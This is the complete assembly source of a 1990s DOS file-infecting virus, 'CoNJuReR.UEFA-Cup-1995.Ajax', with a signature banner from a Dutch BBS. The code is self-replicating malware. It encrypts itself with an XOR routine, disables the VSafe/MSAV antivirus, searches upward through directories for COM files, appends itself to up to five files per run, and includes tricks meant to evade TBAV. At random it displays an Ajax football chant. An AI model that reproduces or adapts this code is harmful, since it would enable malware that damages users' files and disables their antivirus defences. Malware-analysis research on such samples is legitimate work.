

%OUT CoNJuReR.UEFA-Cup-1995.Ajax virus by Immortal EAS.
%OUT Little encrypted parasatic non-tsr appending virus. Features:
%OUT  + 50% chance on a little message
%OUT  + Quick spreading routine, 5 infects per run
%OUT  + Downwards traversing (DotDot technique)
%OUT  + VSafe takedown  (!!)
%OUT  + Simple but working version to get Delta Offset
%OUT  + "F" simply does not appear (!?!)
%OUT  + AJAX won UEFA cup 1995!!!
.model  tiny
.code
	
	ORG     100h                    ;COM file remember?!?

dummy:  db      0e9h,02h,00h            ;This is my dummy: JMP START
	db      'C'                     ;Recognition
	ret                             ;Return to dos

start:  xchg    bx,ax                   ;NOP to fool TBAV
	xchg    ax,bx                   ;NOP
	
	mov     ax,0fa01h               ;Let's take down MSAV!!!
	mov     dx,05945h
	int     16h
	
	call    getdlt                  ;Nice way to get delta offset!
realst:
getdlt: pop     bp
	sub     bp, offset getdlt
	call    encdec                  ;TBAV eats '#'
	jmp     codest

encdec: mov     cx,(offset eoe-offset codest)
	mov     si, offset codest
eloop:  db      80h,32h                 ;Xor byte ptr [SI+BP],00h
encnmr: db      00h
	inc     si
	dec     cx
	jnz     eloop
	ret

codest: lea     si,[orgbts+bp]          ;Restore first 4 bytes        
	mov     di,0100h
	movsw
	movsw
	
	push    cs                      ;DS <==> CS
	pop     ds
	
	lea     dx,[eov+bp]             ;Set DTA address
	mov     ah,1ah
	int     21h
	
	mov     ah,2ch                  ;50% chance to print message!
	int     21h
	cmp     dl,32h
	jl      spread

	mov     ah,09h                  ;Bingo! print message!
	lea     dx, [bp+offset welcome]
	int     21h
	mov     ah,00h                  ;Wait for a key!
	int     16h

spread: mov     byte ptr [infcnt+bp],0
	
spraed: mov     ah,4eh                  ;Findfirst
	lea     dx,[fspec+bp]           ;Filespec=*.COM
	
fnext:  cmp     byte ptr [infcnt+bp],5
	je      re_dta
	
	int     21h
	jc      dotdot                  ;No files found
		
	call    writec
	
	jmp     fnext

dotdot: lea     dx,[dotspec+bp]         ;Go to the '..' dir
	mov     ax,3b00h
	int     21h
	jc      re_dta                  ;Root dir ?!? exit virus
	jmp     spraed

re_dta: mov     ah,1ah                  ;Reset DTA
	mov     dx,0080h
	int     21h

	mov     di,0100h                ;Return control to original file!
	push    di
	ret


fspec   db      '*.com',0
dotspec db      '..',0
infcnt  db      0
jmptbl  db      0e9h,00h,00h,'C'
orgbts: db      90h,90h,90h,90h

welcome db      'Ajax is kampioen, Ajax blijft kampioen,',0dh,0ah
	db      'er is nog geen club die daar iets aan kan doen!',0dh,0ah
	db      'CoNJuReR.AJAX Rulez! [iMMoRTaL EAS]',0dh,0ah
	db      'Ajax won UEFA-Cup 1995!!!',0dh,0ah,'$'
zmspec  db      'ZM'
mzspec  db      'MZ'
eoe:                                    ;End Of Encrypted part
writec:                                 ;Infection routine
	lea     dx,[eov+1eh+bp]         ;Open file
	mov     ax,3d02h
	int     21h

	jc      nextf                   ;Error opening file, next!

	xchg    bx,ax

	mov     cx,0004h                ;Read first 4 bytes for check
	mov     ah,3fh                  ; if already infected!
	lea     dx,[orgbts+bp]
	int     21h

	mov     ax, word ptr [zmspec+bp]
	cmp     word ptr [orgbts+bp],ax ;Misnamed .EXE file ?!?
	je      shutit
	mov     ax, word ptr [mzspec+bp]
	cmp     word ptr [orgbts+bp],ax
	je      shutit

	cmp     byte ptr [orgbts+bp+3],'C' ;Already infected
	jz      shutit

	add     byte ptr [infcnt+bp],1
	
	mov     ax,4202h                ;Goto eof
	sub     cx,cx                   ;2 byte version of mov cx,0!!
	cwd                             ;1 byte version of mov dx,0!!
	int     21h

	sub     ax,0003h                ;Use our jmp table
	mov     word ptr [jmptbl+1+bp],ax


getrnd: mov     ah,2ch
	int     21h
	cmp     dl,00h
	je      getrnd

	mov     byte ptr [offset encnmr+bp], dl

	call    encdec

	mov     ah,40h                  ;Implend our viral code into victim
	mov     cx,eov-start
	lea     dx,[bp+start]
	int     21h

	call    encdec

	mov     ax,4200h                ;Goto SOF
	sub     cx,cx
	cwd
	int     21h

	mov     ah,40h                  ;Write first four bytes over
	mov     cx,0004h                ; the original
	lea     dx,[bp+jmptbl]
	int     21h

shutit: mov     ah,3eh                  ;Close victim
	int     21h

nextf:  mov     ah,4fh                  ;Find next file
	ret

eov:                                    ;End Of Virus
end     dummy

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Remember Where You Saw This Phile First ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄ[=] ARRESTED DEVELOPMENT +31.77.547477 The Netherlands [=]ÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

</==>